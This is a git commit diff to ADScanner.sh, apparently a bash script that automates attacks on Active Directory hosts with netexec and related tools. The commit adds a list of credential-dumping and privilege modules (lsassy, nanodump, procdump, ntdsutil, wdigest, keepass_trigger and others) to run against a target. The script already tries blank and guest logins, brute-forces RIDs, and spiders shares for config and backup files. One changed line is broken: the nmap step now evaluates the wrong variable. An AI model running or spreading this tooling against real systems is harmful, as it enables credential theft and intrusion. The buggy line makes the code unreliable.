a090d6111d5af23db14df48bc64f2886c2f08dbf
ElusiveHacker <fluffyblockchain@pm.me>
2025-05-06 16:51:06 +0300

    Update ADScanner.sh

--- ADScanner.sh
+++ ADScanner.sh
@@ -98,6 +98,7 @@ run_netexec_if_port_open() {
     local module=$1
     local ports=$2
     local base_cmd=$3
+    local high_priv=$4  # Flag to indicate if module requires high privileges
     local IFS=','
     for port in $ports; do
         if check_port "$IP" "$port"; then
@@ -107,8 +108,8 @@ run_netexec_if_port_open() {
                 echo "[+] Trying provided credentials: $USERNAME"
                 cmd="$base_cmd -u '$USERNAME' -p '$PASSWORD' $DOMAIN_OPT"
                 eval "$cmd" | tee -a "$OUTPUT_DIR/netexec_${module}_provided-$port.output"
-            else
-                # Try blank username and password
+            elif [ "$high_priv" != "true" ]; then
+                # Try blank username and password for low privilege modules
                 echo "[+] Trying blank username and password"
                 cmd="$base_cmd -u '' -p '' $DOMAIN_OPT"
                 eval "$cmd" | tee -a "$OUTPUT_DIR/netexec_${module}_blank-$port.output"
@@ -120,6 +121,8 @@ run_netexec_if_port_open() {
                 echo "[+] Trying username 'guest' with password 'guest'"
                 cmd="$base_cmd -u 'guest' -p 'guest' $DOMAIN_OPT"
                 eval "$cmd" | tee -a "$OUTPUT_DIR/netexec_${module}_guest_guest-$port.output"
+            else
+                echo "[-] Skipping high privilege module $module (requires credentials)"
             fi
             return 0
         fi
@@ -143,7 +146,7 @@ run_ldap_queries() {
             eval "$ldapsearch_cmd" | tee -a "$OUTPUT_DIR/ldapsearch-$port.output"
             # Run nmap rootdse script
             nmap_cmd="nmap --script=ldap-rootdse -p $port $IP"
-            eval "$nmap_cmd" | tee -a "$OUTPUT_DIR/nmap-ldap-rootdse-$port.output"
+            eval "$cmd" | tee -a "$OUTPUT_DIR/nmap-ldap-rootdse-$port.output"
         fi
     done
     if ! $ldap_open; then
@@ -161,9 +164,9 @@ run_if_port_open "enum4linux" "$SMB_PORTS" "enum4linux -a $IP"
 run_if_port_open "enum4linux-ng" "$SMB_PORTS" "enum4linux-ng $IP"
 
 # Run netexec commands with credential handling
-run_netexec_if_port_open "smb_shares" "$SMB_PORTS" "netexec smb $IP --shares"
-run_netexec_if_port_open "smb_rid" "$SMB_PORTS" "netexec smb $IP --rid-brute"
-run_netexec_if_port_open "smb_spider" "$SMB_PORTS" "netexec smb $IP --spider / --depth 5 --pattern *.txt,*.conf,*.ini,*.bak"
+run_netexec_if_port_open "smb_shares" "$SMB_PORTS" "netexec smb $IP --shares" "false"
+run_netexec_if_port_open "smb_rid" "$SMB_PORTS" "netexec smb $IP --rid-brute" "false"
+run_netexec_if_port_open "smb_spider" "$SMB_PORTS" "netexec smb $IP --spider / --depth 5 --pattern *.txt,*.conf,*.ini,*.bak" "false"
 
 # Run netexec low privilege SMB modules
 low_priv_modules=(
@@ -184,17 +187,50 @@ low_priv_modules=(
     "zerologon"
 )
 for module in "${low_priv_modules[@]}"; do
-    run_netexec_if_port_open "smb_${module}" "$SMB_PORTS" "netexec smb $IP -M $module"
+    run_netexec_if_port_open "smb_${module}" "$SMB_PORTS" "netexec smb $IP -M $module" "false"
+done
+
+# Run netexec high privilege SMB modules (only with provided credentials)
+high_priv_modules=(
+    "enum_dns"
+    "firefox"
+    "get_netconnections"
+    "handlekatz"
+    "hash_spider"
+    "iis"
+    "impersonate"
+    "install_elevated"
+    "keepass_discover"
+    "keepass_trigger"
+    "lsassy"
+    "masky"
+    "msol"
+    "nanodump"
+    "ntdsutil"
+    "ntlmv1"
+    "pi"
+    "procdump"
+    "rdcman"
+    "rdp"
+    "reg-query"
+    "runasppl"
+    "uac"
+    "wcc"
+    "wdigest"
+    "winscp"
+)
+for module in "${high_priv_modules[@]}"; do
+    run_netexec_if_port_open "smb_${module}" "$SMB_PORTS" "netexec smb $IP -M $module" "true"
 done
 
 # Run netexec LDAP module
-run_netexec_if_port_open "ldap" "$LDAP_PORTS" "netexec ldap $IP -M whoami -M domain-users"
+run_netexec_if_port_open "ldap" "$LDAP_PORTS" "netexec ldap $IP -M whoami -M domain-users" "false"
 
 # Run netexec MSSQL module
-run_netexec_if_port_open "mssql" "$MSSQL_PORT" "netexec mssql $IP -M whoami -M databases"
+run_netexec_if_port_open "mssql" "$MSSQL_PORT" "netexec mssql $IP -M whoami -M databases" "false"
 
 # Run netexec WinRM module
-run_netexec_if_port_open "winrm" "$WINRM_PORT" "netexec winrm $IP -M whoami -x 'whoami'"
+run_netexec_if_port_open "winrm" "$WINRM_PORT" "netexec winrm $IP -M whoami -x 'whoami'" "false"
 
 # Run LDAP-specific queries
 run_ldap_queries
